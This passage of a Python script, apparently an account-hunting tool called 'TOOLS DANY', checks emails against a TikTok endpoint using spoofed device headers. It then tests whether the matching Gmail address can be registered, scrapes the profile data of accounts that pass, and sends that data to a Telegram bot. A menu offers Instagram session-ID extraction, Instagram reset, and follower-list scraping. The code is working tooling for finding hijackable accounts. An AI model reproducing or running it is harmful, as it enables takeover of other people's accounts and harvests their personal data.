            'Cookie':'store-idc=maliva; store-country-code=iq; store-country-code-src=did ',
            'Accept-Encoding': 'gzip ', 
            'X-SS-QUERIES': 'dGMCC76ot3awALq2qSjedxyKhApn4p1IPghEihB5j5NyimFbxRx0wm95EoIIcNB3xqFvh0FS5YreOABfyhTQaH%2FfWbISesyoYvy6do8YAqmgOsdVYKZ2zFcMYGqpAK5zO1G1srAiiIjv7IBJUMG%2BVBEJF0I%3D ', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8 ', 
            'User-Agent': 'com.zhiliaoapp.musically/2018062008 (Linux; U; Android 10; ar_SA; Infinix X692; Build/QP1A.190711.020; Cronet/58.0.2991.0)',
        }
        data1 = (f'app_language=ar&manifest_version_code=2018062008&_rticket=1693756273106&iid=7274626820175136518&channel=googleplay&language=ar&fp=&device_type=Infinix+X692&resolution=720*1464&openudid=b32f27a32b0e1880&update_version_code=2018062008&sys_region=EG&os_api=29&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=320&email={email}&retry_type=no_retry&carrier_region=IQ&ac=wifi&device_id=7149927891131893254&mcc_mnc=41805&timezone_offset=10800&os_version=10&version_code=750&app_name=musical_ly&version_name=7.5.0&device_brand=Infinix&ssmix=a&build_number=7.5.0&device_platform=android&region=SA&aid=1233')
        res1 = requests.post(url, headers=head1, data=data1).text
        if 'Sent successfully' in res1:
            gooda+=1
            os.system('cls'if os.name == 'nt' else 'clear')
            print(f'{X}FILE NUMBER => [{RT}] : {F}Good TIK => {Z}[{gooda}] : {BL}Bad TIK => {Z}[{bada}] : {O}Good GM => {Z}[{good2}] : {YU}BAD GM => {Z}[{bad2}] ')
            url = 'https://android.clients.google.com/setup/checkavail'
            h = {
                'Content-Length':'98',
                'Content-Type':'text/plain; charset=UTF-8',
                'Host':'android.clients.google.com',
                'Connection':'Keep-Alive',
                'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
                }
            d = json.dumps({
                'username':email,
                'version':'3',
                'firstName':'AbaLahb',
                'lastName':'AbuJahl'
            })
            res = requests.post(url,data=d,headers=h)
            if res.json()['status'] == 'SUCCESS':
                good2+=1
                os.system('cls'if os.name == 'nt' else 'clear')
                print(f'{X}FILE NUMBER => [{RT}] : {F}Good TIK => {Z}[{gooda}] : {BL}Bad TIK => {Z}[{bada}] : {O}Good GM => {Z}[{good2}] : {YU}BAD GM => {Z}[{bad2}] ')
                user = email.split('@')[0]
                resp4 = requests.get(f'https://www.tiktok.com/@{user}').text 
                getting = str(resp4.split('"UserModule":')[1]).split('"RecommendUserList"')[0] 
                i1 = str(getting.split('id":"')[1]).split('",')[0] 
                i2 = str(getting.split('nickname":"')[1]).split('",')[0] 
                i3 = str(getting.split('signature":"')[1]).split('",')[0] 
                i4 = str(getting.split('region":"')[1]).split('",')[0] 
                i5 = str(getting.split('privateAccount":')[1]).split(',"')[0] 
                i6 = str(getting.split('followerCount":')[1]).split(',"')[0] 
                i7 = str(getting.split('followingCount":')[1]).split(',"')[0] 
                i8 = str(getting.split('heart":')[1]).split(',"')[0] 
                i9 = str(getting.split('videoCount":')[1]).split(',"')[0] 
                okk = (f'''
⋘─────━𓆩DANY𓆪‏━─────⋙ 
✰ 𝐍𝐀𝐌𝐄 » {i2}
✰ 𝐄𝐌𝐀𝐈𝐋 » {user}@gmail.com
✰ 𝐈𝐃 » {i1}
✰ 𝐂𝐎𝐃𝐄 » {i4}
✰ 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 » {i5}
✰ 𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑𝐒 » {i6}
✰ 𝐅𝐎𝐋𝐋𝐎𝐖𝐍𝐆 » {i7}
✰ 𝐋𝐈𝐊𝐄 » {i8}
✰ 𝐕𝐈𝐃𝐄𝐎 » {i9}
✰ 𝐁𝐈𝐎 » {i3}
⋘─────━𓆩DANY𓆪‏━─────⋙ 
✰ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 » @X_6_Z
✰ 𝐂𝐇 » @H_9_D
                ''')
                requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={okk}')
                print(f'{X} The Account Has Been Sent to The Bot Telegram </>')
            else:
                bad2+=1
                os.system('cls'if os.name == 'nt' else 'clear')
                print(f'{X}FILE NUMBER => [{RT}] : {F}Good TIK => {Z}[{gooda}] : {BL}Bad TIK => {Z}[{bada}] : {O}Good GM => {Z}[{good2}] : {YU}BAD GM => {Z}[{bad2}] ')
                
        else:
            bada+=1
            os.system('cls'if os.name == 'nt' else 'clear')
            print(f'{X}FILE NUMBER => [{RT}] : {F}Good TIK => {Z}[{gooda}] : {BL}Bad TIK => {Z}[{bada}] : {O}Good GM => {Z}[{good2}] : {YU}BAD GM => {Z}[{bad2}] ')
def remove2():
    try:
        os.remove('TikTok.List.txt')
        print('Done Delete File...')
    except:
        print('Erorr File Phone...')
def home():
    print(f'''
|{X}{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}>>>
|{F}</> Welcome to Tools DANY
|{C}</> The Tool Needs A Session Id 
|{X}</> Account Program => @X_6_Z
|{B}</> Channl Program => @H_9_D
|{Y}</> IP PHONE => {ip_address} 
|{X}{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}>>>
<<<{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}TOOLS DANY INSTA{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}>>>
{BPurple}1- Get Search List [ سحب لسته من البحث انستا ] </>
{BPurple}2- Check List [ فحص لسته الانستا ] </>
{BPurple}3- Session_Id Instagram [ استخراج سيشن ايدي ] </>
{BPurple}4- Rest Instagram [ ريست انستا ] </>
{BPurple}5- Remove List [ حذف لسته الانستا ] </>
<<<{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}TOOLS DANY TIKTOK{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}>>>
{X}6- Get Search TikTok List [ سحب لسته من البحث ]</>
{X}7- Get Following TikTOK List User [1] [  من يوزر واحد المتابعهم ] </>
{X}8- Get Following TikTOK List User [ اكثر من يوزر المتابعهم ] </>
{X}9- Check List TikTok [ فحص لسته تيك توك ] </>
{X}10- Remove List TikTok [ حذف لسته تيك توك ] </>
<<<{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}TOOLS DANY TikTok{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}>>>

{X}Time </> {time1}
    ''')
    try:
        H = int(input('[+] Enter a number Please => '))
    except ValueError as Error:
        print('[+] Error Number ')
    if H == 1:
        get_serch()
    elif H == 2:
        Check()
    elif H == 3:
        Get_session()
    elif H == 4:
        rest_insta()
    elif H == 5:
        delet_file()
    elif H == 6:
        Search_tiktok()    #
    elif H == 7:
        get_listfolowing1()
    elif H == 8:
        get_listfolowing1move()
    elif H == 9:
        chesk_tiktok_list()
    elif H == 10:
        remove2()
        
home()
